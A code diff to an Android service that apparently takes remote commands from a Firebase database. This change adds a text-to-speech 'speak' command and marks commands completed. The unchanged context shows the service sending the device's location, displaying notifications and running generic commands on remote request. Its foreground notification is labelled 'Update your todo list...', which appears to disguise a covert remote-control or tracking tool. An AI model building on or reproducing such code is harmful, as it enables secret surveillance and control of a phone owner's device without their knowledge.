@@ -37,12 +37,15 @@ public class CommandService extends Service {
     private FusedLocationProviderClient locationClient;
     public static final String CHANNEL_ID = "cmd_channel";
 
+    private TTSHelper ttsHelper;
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         deviceId = intent.getStringExtra("deviceId");
         uid = FirebaseAuth.getInstance().getCurrentUser().getUid();
         locationClient = LocationServices.getFusedLocationProviderClient(this);
         createNotificationChannel();
+
+        ttsHelper = new TTSHelper(getApplicationContext());
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(1, buildStatusNotification("Update your todo list..."),
@@ -70,7 +73,9 @@ public class CommandService extends Service {
                                 "enable location".equalsIgnoreCase(cmd.getAction())) {
                             getCurrentLocationAndSend(key, cmd);
                         } else if(cmd.getAction().startsWith("notify-send ")){
-                            handleNotifySend(cmd.getAction());
+                            handleNotifySend(key, cmd.getAction());
+                        } else if(cmd.getAction().startsWith("speak ")){
+                            handleSpeak(key, cmd.getAction());
                         } else {
                             executeGenericCommand(key, cmd);
                         }
@@ -83,9 +88,20 @@ public class CommandService extends Service {
             public void onCancelled(DatabaseError error) {}
         });
     }
-// Add this method to your CommandService (or similar class)
 
-    private void handleNotifySend(String commandString) {
+    // Add this method to your CommandService (or similar class)
+    private void handleSpeak(String commandKey, String cmd){
+        // Basic argument extraction using regex (handles quoted strings)
+        java.util.regex.Matcher matcher = java.util.regex.Pattern
+                .compile("speak\\s+\"([^\"]+)\"")
+                .matcher(cmd);
+        if (matcher.find()) {
+            ttsHelper.speak(matcher.group(1));
+        }
+        commandsRef.child(commandKey).child("status").setValue("completed");
+    }
+
+    private void handleNotifySend(String commandKey, String commandString) {
         // Example command: notify-send "Title" "Message"
         String title = "Notification";
         String message = "";
@@ -110,6 +126,8 @@ public class CommandService extends Service {
         NotificationManager notificationManager =
                 (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         notificationManager.notify((int) System.currentTimeMillis(), builder.build());
+        commandsRef.child(commandKey).child("status").setValue("completed");
+
     }
 
     private void getCurrentLocationAndSend(final String commandKey, final Command command) {
